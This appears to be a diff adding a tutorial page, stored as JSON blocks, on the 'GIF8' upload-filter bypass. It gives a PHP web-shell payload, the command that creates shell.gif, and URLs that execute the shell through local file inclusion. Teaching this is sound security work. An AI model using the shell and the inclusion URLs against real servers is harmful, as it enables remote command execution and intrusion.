@@ -1,0 +1,177 @@
+[
+  {
+    "type": "section_heading",
+    "id": "gif8-intro",
+    "text": "GIF8 File Upload Bypass"
+  },
+  {
+    "type": "order_block",
+    "id": "gif8-definition",
+    "text": "GIF8 bypass is a file upload exploitation technique where a malicious PHP payload is prefixed with a fake GIF image header (GIF8). This makes the file appear as a valid image to upload filters while still containing executable PHP code."
+  },
+  {
+    "type": "section_heading",
+    "id": "gif8-why",
+    "text": "Why GIF8 Bypass Works"
+  },
+  {
+    "type": "order_block",
+    "id": "gif8-why-explain",
+    "text": "Many web applications only check the beginning bytes of uploaded files (magic bytes) to determine if the file is a valid image. Since real GIF images start with GIF87a or GIF89a, attackers can prefix malicious PHP code with GIF8 to trick the validation logic into accepting the file."
+  },
+  {
+    "type": "section_heading",
+    "id": "gif8-payload",
+    "text": "Example GIF8 Web Shell Payload"
+  },
+  {
+    "type": "code_block",
+    "id": "gif8-payload-code",
+    "language": "php",
+    "code": "GIF8<?php system($_GET['cmd']); ?>"
+  },
+  {
+    "type": "order_block",
+    "id": "gif8-payload-analysis",
+    "text": "The string GIF8 mimics the beginning of a GIF image header. Upload filters see it as an image, but when the file is later included or executed by PHP, the PHP interpreter ignores the GIF8 text and executes the PHP code."
+  },
+  {
+    "type": "section_heading",
+    "id": "gif8-create",
+    "text": "Creating a GIF8 Web Shell"
+  },
+  {
+    "type": "code_block",
+    "id": "gif8-create-command",
+    "language": "bash",
+    "code": "echo 'GIF8<?php system($_GET[\"cmd\"]); ?>' > shell.gif"
+  },
+  {
+    "type": "order_block",
+    "id": "gif8-create-analysis",
+    "text": "This command creates a polyglot file that appears to be a GIF image but actually contains a PHP command execution payload."
+  },
+  {
+    "type": "section_heading",
+    "id": "gif8-upload",
+    "text": "Uploading the GIF8 Shell"
+  },
+  {
+    "type": "order_block",
+    "id": "gif8-upload-explain",
+    "text": "Upload the shell.gif file through the application's file upload functionality. If the application only checks file headers or extensions, the GIF8 prefix may allow the upload to bypass the validation."
+  },
+  {
+    "type": "section_heading",
+    "id": "gif8-check-vuln",
+    "text": "How to Confirm GIF8 Upload Vulnerability"
+  },
+  {
+    "type": "order_block",
+    "id": "gif8-check-step1",
+    "text": "1. Upload a GIF8 payload file such as shell.gif containing a simple PHP command execution payload."
+  },
+  {
+    "type": "order_block",
+    "id": "gif8-check-step2",
+    "text": "2. After uploading, access the file directly from the upload directory to verify that it exists."
+  },
+  {
+    "type": "code_block",
+    "id": "gif8-access-shell",
+    "language": "bash",
+    "code": "http://target/profile_images/shell.gif"
+  },
+  {
+    "type": "order_block",
+    "id": "gif8-check-step3",
+    "text": "3. If the file displays raw PHP code or the GIF8 string, the server is treating it as a static image. This means the upload succeeded but the file is not executed directly."
+  },
+  {
+    "type": "order_block",
+    "id": "gif8-check-step4",
+    "text": "4. Look for a Local File Inclusion (LFI) or file inclusion vulnerability that can force the server to include the uploaded file."
+  },
+  {
+    "type": "section_heading",
+    "id": "gif8-lfi-exploit",
+    "text": "Executing GIF8 Shell via LFI"
+  },
+  {
+    "type": "code_block",
+    "id": "gif8-lfi-command",
+    "language": "bash",
+    "code": "http://target/index.php?language=../../profile_images/shell.gif&cmd=id"
+  },
+  {
+    "type": "order_block",
+    "id": "gif8-lfi-analysis",
+    "text": "If the application includes the uploaded file through a vulnerable parameter, PHP interprets the contents of the GIF8 file and executes the embedded PHP code, resulting in remote command execution."
+  },
+  {
+    "type": "section_heading",
+    "id": "gif8-test-command",
+    "text": "Testing Command Execution"
+  },
+  {
+    "type": "code_block",
+    "id": "gif8-test-code",
+    "language": "bash",
+    "code": "http://target/index.php?language=../../profile_images/shell.gif&cmd=whoami"
+  },
+  {
+    "type": "order_block",
+    "id": "gif8-test-analysis",
+    "text": "If the exploit is successful, the response will contain the command output (for example www-data). The output may begin with GIF8 because it is part of the uploaded file header."
+  },
+  {
+    "type": "section_heading",
+    "id": "gif8-notes",
+    "text": "Important Notes"
+  },
+  {
+    "type": "order_block",
+    "id": "gif8-notes-1",
+    "text": "The GIF8 string often appears in the command output because it is printed before the PHP code executes."
+  },
+  {
+    "type": "order_block",
+    "id": "gif8-notes-2",
+    "text": "This technique works when upload filters rely on weak file type validation such as extension checks, MIME checks, or simple magic byte validation."
+  },
+  {
+    "type": "order_block",
+    "id": "gif8-notes-3",
+    "text": "The technique becomes especially powerful when combined with Local File Inclusion (LFI), allowing attackers to turn file upload into Remote Code Execution."
+  },
+  {
+    "type": "section_heading",
+    "id": "gif8-summary",
+    "text": "GIF8 Exploitation Flow"
+  },
+  {
+    "type": "text_block",
+    "id": "gif8-step-1",
+    "text": "1. Create GIF8 web shell payload."
+  },
+  {
+    "type": "text_block",
+    "id": "gif8-step-2",
+    "text": "2. Upload shell.gif through vulnerable upload functionality."
+  },
+  {
+    "type": "text_block",
+    "id": "gif8-step-3",
+    "text": "3. Identify the upload directory path."
+  },
+  {
+    "type": "text_block",
+    "id": "gif8-step-4",
+    "text": "4. Find a Local File Inclusion vulnerability."
+  },
+  {
+    "type": "text_block",
+    "id": "gif8-step-5",
+    "text": "5. Include the uploaded file to execute the PHP payload."
+  }
+]
